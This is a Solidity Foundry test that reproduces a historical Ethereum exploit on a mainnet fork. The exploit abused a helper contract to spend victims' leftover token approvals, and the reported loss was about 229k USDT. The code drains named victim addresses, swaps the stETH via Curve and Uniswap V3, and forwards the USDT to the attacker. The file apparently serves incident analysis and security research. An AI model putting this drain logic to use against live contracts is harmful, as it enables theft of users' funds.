// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";
import {IERC20, ICurvePool, ILendingPool, IWETH, Uni_Pair_V3, USDT as IUSDTNoReturn} from "../interface.sol";

// @KeyInfo - Total Lost : 229,030.97 USDT
// Attacker : 0x224c940003dd0b8aa1a20e655ced0363d573fa46
// Attack Contract : 0x99464c162b5816384e76f14912a87af9834c65db
// Vulnerable Contract : 0xa152751251a72f7d9e8a8998e9eadbefbf10e4f3
// Attack Tx : https://etherscan.io/tx/0x57709a498f27c7219b634ae20e7d2cbf9ab8dd6aca7b3845fabf93b57760b576

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0xa152751251a72f7d9e8a8998e9eadbefbf10e4f3#code

// @Analysis
// twitter guy : https://t.me/defimon_alerts/2987
//
// The attacker routed through an already-authorized spending contract and its helper to reuse victim
// AllowanceTarget approvals. The PoC keeps the vulnerable drain path exact, then uses a balance-derived
// liquidation path to consolidate the drained assets into USDT for the transaction sender.

address constant ATTACKER = 0x224C940003dd0b8aA1A20e655ced0363D573fa46;
address constant AUTHORIZED_SPENDER = 0xa152751251a72F7D9E8A8998e9EadBefBF10E4f3;
address constant SPENDER_HELPER = 0xfc40f02A22A78eaB1021A5aDaF5b3dd608da5837;
address constant AAVE_POOL = 0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9;
address constant ALLOWANCE_TARGET = 0x2990A16D2C37163f26F86d7af219064Ba5CD5605;
address constant CURVE_STETH_POOL = 0xDC24316b9AE028F1497c275EB9192a3Ea0f67022;
address constant UNISWAP_V3_WETH_USDT = 0x11b815efB8f581194ae79006d24E0d814B7697F6;

address constant AUSDT = 0x3Ed3B47Dd13EC9a98b44e6204A523E766B225811;
address constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
address constant STETH = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84;
address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

address constant AUSDT_USDT_OWNER = 0x0636D27Cc6AcE1462D175Ee72E617A3707ED7ACE;
address constant USDT_OWNER_TWO = 0x1bD7e605A63Df5698fC96B2f9F41Aee1671bcf7a;
address constant USDT_OWNER_THREE = 0xa0b44f5Bd1Ed468C15540d1105BAa34fE7FD0F3e;
address constant USDT_OWNER_FOUR = 0xb4e048665128E1690fC408e8CC180E487C940dDe;
address constant USDT_OWNER_FIVE = 0x1aBf360654DfAe0178D20c98836c233c4a32bd02;
address constant USDT_OWNER_SIX = 0xabEBe21a31eBdD6A0b94eF896049868f53239A79;
address constant STETH_OWNER = 0x2b75DF91cC500e04D6Bac3190368637E5C33d4A0;

interface ISpenderHelper {
    function spendFromUser(address owner, address token, uint256 amount) external;
}

contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        uint256 forkBlock = 24_973_581;
        vm.createSelectFork("mainnet", forkBlock);

        fundingToken = USDT;
        attacker = ATTACKER;

        vm.label(ATTACKER, "Attacker");
        vm.label(AUTHORIZED_SPENDER, "Authorized Spending Contract");
        vm.label(SPENDER_HELPER, "Spender Helper");
        vm.label(ALLOWANCE_TARGET, "Allowance Target");
        vm.label(AAVE_POOL, "Aave V2 LendingPool");
        vm.label(CURVE_STETH_POOL, "Curve stETH Pool");
        vm.label(UNISWAP_V3_WETH_USDT, "Uniswap V3 WETH/USDT Pool");
        vm.label(USDT, "USDT");
        vm.label(AUSDT, "aUSDT");
        vm.label(STETH, "stETH");
        vm.label(WETH, "WETH");
    }

    function testExploit() public balanceLog {
        uint256 attackerUsdtBefore = IERC20(USDT).balanceOf(ATTACKER);

        AttackCoordinator coordinator = new AttackCoordinator();
        vm.label(address(coordinator), "Local Attack Coordinator");
        uint256 expectedStableExposure = stableTokenExposure();

        // step 1: execute the vulnerable allowance-spending path as the historical authorized spender.
        drainTo(address(coordinator), AUSDT_USDT_OWNER, AUSDT, true);
        drainUsdt(address(coordinator), AUSDT_USDT_OWNER);
        drainUsdt(address(coordinator), USDT_OWNER_TWO);
        drainUsdt(address(coordinator), USDT_OWNER_THREE);
        drainUsdt(address(coordinator), USDT_OWNER_FOUR);
        drainUsdt(address(coordinator), USDT_OWNER_FIVE);
        drainUsdt(address(coordinator), USDT_OWNER_SIX);
        drainTo(address(coordinator), STETH_OWNER, STETH, false);

        coordinator.liquidateAndForward();

        uint256 attackerUsdtAfter = IERC20(USDT).balanceOf(ATTACKER);
        assertGt(attackerUsdtAfter - attackerUsdtBefore, expectedStableExposure);
    }

    function stableTokenExposure() private view returns (uint256) {
        return drainable(AUSDT_USDT_OWNER, AUSDT) + drainable(AUSDT_USDT_OWNER, USDT) + drainable(USDT_OWNER_TWO, USDT)
            + drainable(USDT_OWNER_THREE, USDT) + drainable(USDT_OWNER_FOUR, USDT) + drainable(USDT_OWNER_FIVE, USDT)
            + drainable(USDT_OWNER_SIX, USDT);
    }

    function drainUsdt(address receiver, address owner) private {
        drainTo(receiver, owner, USDT, false);
    }

    function drainTo(address receiver, address owner, address token, bool redeemAave) private {
        uint256 amount = drainable(owner, token);

        vm.prank(AUTHORIZED_SPENDER);
        ISpenderHelper(SPENDER_HELPER).spendFromUser(owner, token, amount);

        if (redeemAave) {
            uint256 aTokenBalance = IERC20(token).balanceOf(AUTHORIZED_SPENDER);
            vm.prank(AUTHORIZED_SPENDER);
            ILendingPool(AAVE_POOL).withdraw(USDT, aTokenBalance, receiver);
        } else {
            uint256 amountOut = IERC20(token).balanceOf(AUTHORIZED_SPENDER);
            transferFromAuthorizedSpender(token, receiver, amountOut);
        }
    }

    function drainable(address owner, address token) private view returns (uint256 amount) {
        uint256 ownerBalance = IERC20(token).balanceOf(owner);
        uint256 allowance = IERC20(token).allowance(owner, ALLOWANCE_TARGET);
        amount = ownerBalance < allowance ? ownerBalance : allowance;
    }

    function transferFromAuthorizedSpender(address token, address receiver, uint256 amount) private {
        vm.prank(AUTHORIZED_SPENDER);
        if (token == USDT) {
            IUSDTNoReturn(USDT).transfer(receiver, amount);
        } else {
            IERC20(token).transfer(receiver, amount);
        }
    }
}

contract AttackCoordinator {
    // Uniswap v3 TickMath lower sqrt price bound; zeroForOne swaps require a limit strictly above it.
    uint160 private constant UNISWAP_MIN_SQRT_RATIO = 4_295_128_739;
    uint160 private constant MIN_SQRT_RATIO_PLUS_ONE = UNISWAP_MIN_SQRT_RATIO + 1;
    int128 private constant CURVE_ETH_INDEX = 0;
    int128 private constant CURVE_STETH_INDEX = 1;
    // One-unit floor for Curve min output and stETH dust retention.
    uint256 private constant MIN_SWAP_OUTPUT = 1;

    receive() external payable {}

    function liquidateAndForward() external {
        // step 2: convert the drained stETH to ETH on Curve.
        uint256 stEthToSwap = IERC20(STETH).balanceOf(address(this)) - MIN_SWAP_OUTPUT;
        IERC20(STETH).approve(CURVE_STETH_POOL, stEthToSwap);
        ICurvePool(CURVE_STETH_POOL).exchange(CURVE_STETH_INDEX, CURVE_ETH_INDEX, stEthToSwap, MIN_SWAP_OUTPUT);

        // step 3: wrap all ETH received from Curve and convert the full WETH balance to USDT.
        IWETH(payable(WETH)).deposit{value: address(this).balance}();
        swapV3ExactInput(UNISWAP_V3_WETH_USDT, WETH, IERC20(WETH).balanceOf(address(this)));

        // step 4: forward consolidated USDT to the same final receiver as the transaction.
        IUSDTNoReturn(USDT).transfer(ATTACKER, IERC20(USDT).balanceOf(address(this)));
    }

    function swapV3ExactInput(address pool, address tokenIn, uint256 amountIn) private {
        Uni_Pair_V3(pool).swap(address(this), true, int256(amountIn), MIN_SQRT_RATIO_PLUS_ONE, abi.encode(tokenIn));
    }

    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata) external {
        payV3Pool(amount0Delta, amount1Delta);
    }

    function payV3Pool(int256 amount0Delta, int256 amount1Delta) private {
        if (amount0Delta > 0) {
            transferToken(Uni_Pair_V3(msg.sender).token0(), msg.sender, uint256(amount0Delta));
        }
        if (amount1Delta > 0) {
            transferToken(Uni_Pair_V3(msg.sender).token1(), msg.sender, uint256(amount1Delta));
        }
    }

    function transferToken(address token, address receiver, uint256 amount) private {
        if (token == USDT) {
            IUSDTNoReturn(USDT).transfer(receiver, amount);
        } else {
            IERC20(token).transfer(receiver, amount);
        }
    }
}
